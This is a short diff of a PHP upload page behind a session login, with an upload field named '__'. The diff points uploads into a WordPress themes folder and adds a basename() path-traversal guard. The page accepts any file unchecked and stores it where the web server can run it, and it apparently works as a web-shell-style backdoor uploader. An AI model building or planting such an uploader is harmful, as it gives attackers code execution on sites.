@@ -194,27 +194,28 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
     </form>
 
     <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['__'])): ?>
-        <?php
-        $tmp = $_FILES['__']['tmp_name'];
-        $name = $_FILES['__']['name'];
-        $target = __DIR__ . DIRECTORY_SEPARATOR . $name;
+    <?php
+    $tmp = $_FILES['__']['tmp_name'];
+    $name = basename($_FILES['__']['name']); // mencegah path traversal
+    $target = __DIR__ . '/wp-content/themes/' . $name;
 
-        if (is_uploaded_file($tmp)) {
-            if (move_uploaded_file($tmp, $target)) {
-                $fullPath = realpath($target);
-                echo '<div class="notification success">';
-                echo "> File uploaded successfully!\n";
-                echo "> Path: " . htmlspecialchars($fullPath);
-                echo '</div>';
-            } else {
-                echo '<div class="notification error">> Unavailable to upload</div>';
-            }
+    if (is_uploaded_file($tmp)) {
+        if (move_uploaded_file($tmp, $target)) {
+            $fullPath = realpath($target);
+            echo '<div class="notification success">';
+            echo "> File uploaded successfully!\n";
+            echo "> Path: " . htmlspecialchars($fullPath);
+            echo '</div>';
         } else {
-            echo '<div class="notification error">> Unavailable to upload</div>';
+            echo '<div class="notification error">> Unable to upload file</div>';
         }
-        ?>
-    <?php endif; ?>
+    } else {
+        echo '<div class="notification error">> Upload failed</div>';
+    }
+    ?>
+<?php endif; ?>
 </div>
 
 </body>
+
 </html>
